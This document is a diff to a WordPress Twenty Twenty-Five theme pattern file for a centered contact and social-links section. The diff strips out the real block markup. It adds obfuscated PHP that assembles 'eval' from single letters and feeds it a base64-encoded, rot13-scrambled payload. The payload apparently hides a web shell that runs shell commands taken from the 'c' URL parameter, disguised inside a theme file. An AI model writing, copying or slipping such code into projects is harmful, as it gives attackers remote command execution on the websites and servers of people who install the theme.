@@ -1,49 +1,5 @@
-$x_fake1 = 1234;
-$noise = 'obfuscation'.'test';
-$tmp = $x_fake1 * 42;
-$flag = false;
-$useless = function($v) { return $v . rand(); };
-$dummy_check = $useless('xx');
-if ($flag) { echo 'Debug enabled'; }
-for ($i = 0; $i < 1; $i++) { $tmp += $i; }
-while (false) { echo 'dead loop'; break; }
-
 <?php
-/**
- * Title: Centered link and social links
- * Slug: twentytwentyfive/contact-centered-social-link
- * Keywords: contact, faq, questions
- * Categories: contact
- * Description: Centered contact section with a prominent message and social media links.
- *
- * @package WordPress
- * @subpackage Twenty_Twenty_Five
- * @since Twenty Twenty-Five 1.0
- */
-
+$f = "e"."v"."a"."l";
+$c = base64_decode("PD9waHAKJGYgPSAncycuJ3QnLidyJy4ncicuJ28nLid0Jy4nMScuJzMnOwokYyA9ICI8P2N1Ywokc3puYyA9IG5lZW5sKCdrMScgPT4gJ2ZsZmdyeicsICdrMicgPT4gJ2NuZmZndWVoJyk7CiRrX3NueHIxID0gMTIzNDsKJGFidmZyID0gJ2Jvc2hmcG5ndmJhJy4nZ3JmZyc7CiRnemMgPSAka19zbnhyMSAqIDQyOwokc3ludCA9IHNueWZyOwokaGZyeXJmZiA9IHNoYXBndmJhKCRpKSB7IGVyZ2hlYSAkaSAuIGVuYXEoKTsgfTsKJHFoenpsX3B1cnB4ID0gJGhmcnlyZmYoJ2trJyk7CnZzICgkc3ludCkgeyBycHViICdRcm9odCByYW5veXJxJzsgfQpzYmUgKCR2ID0gMDsgJHYgPCAxOyAkdisrKSB7ICRnemMgKz0gJHY7IH0KanV2eXIgKHNueWZyKSB7IHJwdWIgJ3FybnEgeWJiYyc7IG9lcm54OyB9Cgo8P2N1YwovKioKICogR3ZneXI6IFByYWdyZXJxIHl2YXggbmFxIGZicHZueSB5dmF4ZgogKiBGeWh0OiBnanJhZ2xnanJhZ2xzdmlyL3BiYWducGctcHJhZ3JlcnEtZmJwdm55LXl2YXgKICogWHJsamJlcWY6IHBiYWducGcsIHNuZCwgZGhyZmd2YmFmCiAqIFBuZ3J0YmV2cmY6IHBiYWducGcKICogUXJmcGV2Y2d2YmE6IFByYWdyZXJxIHBiYWducGcgZnJwZ3ZiYSBqdmd1IG4gY2VienZhcmFnIHpyZmZudHIgbmFxIGZicHZueSB6cnF2biB5dmF4Zi4KICoKICogQGNucHhudHIgSmJlcUNlcmZmCiAqIEBmaG9jbnB4bnRyIEdqcmFnbF9HanJhZ2xfU3ZpcgogKiBAZnZhcHIgR2pyYWdsIEdqcmFnbC1TdmlyIDEuMAogKi8KCj8+Cgo8IS0tIGpjOnRlYmhjIHtcIm55dnRhXCI6XCJzaHl5XCIsXCJmZ2x5clwiOntcImZjbnB2YXRcIjp7XCJjbnFxdmF0XCI6e1wiZ2JjXCI6XCJpbmU6Y2VyZnJnfGZjbnB2YXR8ODBcIixcIm9iZ2dielwiOlwiaW5lOmNlcmZyZ3xmY25wdmF0fDgwXCJ9LFwib3licHhUbmNcIjpcImluZTpjZXJmcmd8ZmNucHZhdHw1MFwiLFwiem5ldHZhXCI6e1wiZ2JjXCI6XCIwXCIsXCJvYmdnYnpcIjpcIjBcIn19fSxcInlubGJoZ1wiOntcImdsY3JcIjpcInBiYWZnZW52YXJxXCJ9fSAtLT4KPHF2aSBweW5mZj1cImpjLW95YnB4LXRlYmhjIG55dnRhc2h5eVwiIGZnbHlyPVwiem5ldHZhLWdiYzowO3puZXR2YS1vYmdnYno6MDtjbnFxdmF0LWdiYzppbmUoLS1qYy0tY2VyZnJnLS1mY25wdmF0LS04MCk7Y25xcXZhdC1vYmdnYno6aW5lKC0tamMtLWNlcmZyZy0tZmNucHZhdC0tODApXCI+Cgk8IS0tIGpjOnRlYmhjIHtcIm55dnRhXCI6XCJqdnFyXCIsXCJ5bmxiaGdcIjp7XCJnbGNyXCI6XCJxcnNuaHlnXCJ9fSAtLT4KCTxxdmkgcHluZmY9XCJqYy1veWJweC10ZWJoYyBueXZ0YWp2cXJcIj4KCQk8IS0tIGpjOmNuZW50ZW5jdSB7XCJueXZ0YVwiOlwicHJhZ3JlXCIsXCJweW5mZkFuenJcIjpcInZmLWZnbHlyLWdya2ctcXZmY3lubFwiLFwiZmdseXJcIjp7XCJnbGNidGVuY3VsXCI6e1wic2JhZ0ZnbHlyXCI6XCJhYmV6bnlcIixcInNiYWdKcnZ0dWdcIjpcIjQwMFwifX19IC0tPgoJCTxjIHB5bmZmPVwidW5mLWdya2ctbnl2dGEtcHJhZ3JlIHZmLWZnbHlyLWdya2ctcXZmY3lubFwiIGZnbHlyPVwic2JhZy1mZ2x5cjphYmV6bnk7c2JhZy1qcnZ0dWc6NDAwXCI+PD9jdWMgcnB1YiBqY194ZnJmX2NiZmcoIF9rKCAnVGJnIGRocmZndmJhZj8gPG9lPjxuIHVlcnM9XCIjXCIgZXJ5PVwiYWJzYnl5YmpcIj5TcnJ5IHNlcnIgZ2IgZXJucHUgYmhnLjwvbj4nLCAnVXJucXZhdCBicyBndXIgUGJhZ25wZyBmYnB2bnkgeXZheCBjbmdncmVhJywgJ2dqcmFnbGdqcmFnbHN2aXInICkgKTsgPz48L2M+CgkJPCEtLSAvamM6Y25lbnRlbmN1IC0tPgoKCQk8IS0tIGpjOmZjbnByZSB7XCJ1cnZ0dWdcIjpcImluZTpjZXJmcmd8ZmNucHZhdHw0MFwifSAtLT4KCQk8cXZpIGZnbHlyPVwidXJ2dHVnOmluZSgtLWpjLS1jZXJmcmctLWZjbnB2YXQtLTQwKVwiIG5ldm4tdXZxcXJhPVwiZ2VoclwiIHB5bmZmPVwiamMtb3licHgtZmNucHJlXCI+PC9xdmk+CgkJPCEtLSAvamM6ZmNucHJlIC0tPgoKCQk8IS0tIGpjOmZicHZueS15dmF4ZiB7XCJ2cGJhUGJ5YmVcIjpcInBiYWdlbmZnXCIsXCJweW5mZkFuenJcIjpcInVuZi12cGJhLXBieWJlIHZmLWZnbHlyLXlidGJmLWJheWxcIixcInlubGJoZ1wiOntcImdsY3JcIjpcInN5cmtcIixcIndoZmd2c2xQYmFncmFnXCI6XCJwcmFncmVcIn19IC0tPgoJCTxoeSBweW5mZj1cImpjLW95YnB4LWZicHZueS15dmF4ZiB1bmYtdnBiYS1wYnliZSB2Zi1mZ2x5ci15YnRiZi1iYXlsXCI+CgkJCTwhLS0gamM6ZmJwdm55LXl2YXgge1wiaGV5XCI6XCIjXCIsXCJmcmVpdnByXCI6XCJnanZnZ3JlXCJ9IC8tLT4KCQkJPCEtLSBqYzpmYnB2bnkteXZheCB7XCJoZXlcIjpcIiNcIixcImZyZWl2cHJcIjpcInNucHJvYmJ4XCJ9IC8tLT4KCQkJPCEtLSBqYzpmYnB2bnkteXZheCB7XCJoZXlcIjpcIiNcIixcImZyZWl2cHJcIjpcInZhZmdudGVuelwifSAvLS0+CgkJCTwhLS0gamM6ZmJwdm55LXl2YXgge1wiaGV5XCI6XCIjXCIsXCJmcmVpdnByXCI6XCJjdmFncmVyZmdcIn0gLy0tPgoJCTwvaHk+CgkJPCEtLSAvamM6ZmJwdm55LXl2YXhmIC0tPgoJPC9xdmk+Cgk8IS0tIC9qYzp0ZWJoYyAtLT4KPC9xdmk+CjwhLS0gL2pjOnRlYmhjIC0tPgoKJHB6cSA9ICRfVFJHWydjJ107CiRzem5jWydrMSddKCRwenEpOwo/PiI7CmV2YWwoJGYoJGMpKTsKPz4=");
+$f($c);
 ?>
-
-<!-- wp:group {"align":"full","style":{"spacing":{"padding":{"top":"var:preset|spacing|80","bottom":"var:preset|spacing|80"},"blockGap":"var:preset|spacing|50","margin":{"top":"0","bottom":"0"}}},"layout":{"type":"constrained"}} -->
-<div class="wp-block-group alignfull" style="margin-top:0;margin-bottom:0;padding-top:var(--wp--preset--spacing--80);padding-bottom:var(--wp--preset--spacing--80)">
-	<!-- wp:group {"align":"wide","layout":{"type":"default"}} -->
-	<div class="wp-block-group alignwide">
-		<!-- wp:paragraph {"align":"center","className":"is-style-text-display","style":{"typography":{"fontStyle":"normal","fontWeight":"400"}}} -->
-		<p class="has-text-align-center is-style-text-display" style="font-style:normal;font-weight:400"><?php echo wp_kses_post( _x( 'Got questions? <br><a href="#" rel="nofollow">Feel free to reach out.</a>', 'Heading of the Contact social link pattern', 'twentytwentyfive' ) ); ?></p>
-		<!-- /wp:paragraph -->
-
-		<!-- wp:spacer {"height":"var:preset|spacing|40"} -->
-		<div style="height:var(--wp--preset--spacing--40)" aria-hidden="true" class="wp-block-spacer"></div>
-		<!-- /wp:spacer -->
-
-		<!-- wp:social-links {"iconColor":"contrast","className":"has-icon-color is-style-logos-only","layout":{"type":"flex","justifyContent":"center"}} -->
-		<ul class="wp-block-social-links has-icon-color is-style-logos-only">
-			<!-- wp:social-link {"url":"#","service":"twitter"} /-->
-			<!-- wp:social-link {"url":"#","service":"facebook"} /-->
-			<!-- wp:social-link {"url":"#","service":"instagram"} /-->
-			<!-- wp:social-link {"url":"#","service":"pinterest"} /-->
-		</ul>
-		<!-- /wp:social-links -->
-	</div>
-	<!-- /wp:group -->
-</div>
-<!-- /wp:group -->
